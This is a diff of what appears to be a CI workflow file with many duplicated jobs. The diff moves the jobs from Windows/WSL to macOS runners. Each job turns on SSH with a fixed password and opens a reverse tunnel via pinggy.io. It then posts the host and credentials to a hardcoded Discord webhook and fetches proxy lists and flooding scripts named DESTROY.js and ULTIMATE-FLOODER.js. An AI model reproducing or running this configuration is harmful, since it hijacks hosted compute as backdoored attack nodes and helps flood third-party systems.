@@ -55,7 +55,7 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
@@ -115,7 +115,7 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
@@ -175,7 +175,7 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
@@ -235,7 +235,7 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
@@ -295,7 +295,7 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
@@ -355,7 +355,7 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
@@ -415,7 +415,7 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
@@ -426,27 +426,20 @@ jobs:
           sleep 21000
 
   pinggy-8:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -462,7 +455,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -480,38 +472,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-9:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -527,7 +512,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -545,38 +529,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-10:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -592,7 +569,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -610,38 +586,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-11:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -657,7 +626,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -675,38 +643,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-12:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -722,7 +683,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -740,38 +700,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-13:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -787,7 +740,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -805,38 +757,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-14:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -852,7 +797,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -870,38 +814,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-15:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -917,7 +854,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -935,38 +871,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-16:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -982,7 +911,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
           wget -O ULTIMATE-FLOODER.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/ULTIMATE-FLOODER.js
@@ -1000,38 +928,31 @@ jobs:
           ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
           sleep 15
 
-          LINK=$(grep -oP 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
+          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
 
           curl -H "Content-Type: application/json" \
           -X POST \
-          -d "{\"content\":\"SSH: $CLEAN\nUser: root\nPass: Venom123!\"}" \
+          -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" \
           "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc"
 
           sleep 21000
 
   pinggy-17:
-    runs-on: windows-latest
+    runs-on: macos-latest
     timeout-minutes: 360
     steps:
       - uses: actions/checkout@v4
-      - uses: Vampire/setup-wsl@v3
-        with:
-          distribution: Ubuntu-22.04
-          wsl-shell-user: root
-      - name: FULL SETUP in WSL
-        shell: wsl-bash {0}
+      - name: FULL SETUP
         run: |
           set -e
 
-          apt update -y
-          apt install -y openssh-server curl wget python3 python3-pip
+          sudo systemsetup -setremotelogin on
+          sudo sysadminctl -resetPasswordFor runner -newPassword Venom123!
+          sudo sed -i '' 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo launchctl kickstart -k system/com.openssh.sshd || true
 
-          echo 'root:Venom123!' | chpasswd
-          sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-          service ssh start
+          brew install wget || true
 
           curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
           export NVM_DIR="$HOME/.nvm"
@@ -1047,7 +968,6 @@ jobs:
           wget -O proxy.txt https://raw.githubusercontent.com/akbarali123A/proxy_scraper/refs/heads/main/http_proxies.txt
 
           wget -O CACHE.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/CACHE.js
-          wget -O client.py https://raw.githubusercontent.com/netshort63-debug/awdad/main/client.py
           wget -O DESTROY.js https://raw.githubusercontent.com/netshort63-debug/awdad/main/DESTROY.js
           wget -O ua.txt https://raw.githubusercontent.com/netshort63-debug/awdad/main/ua.txt
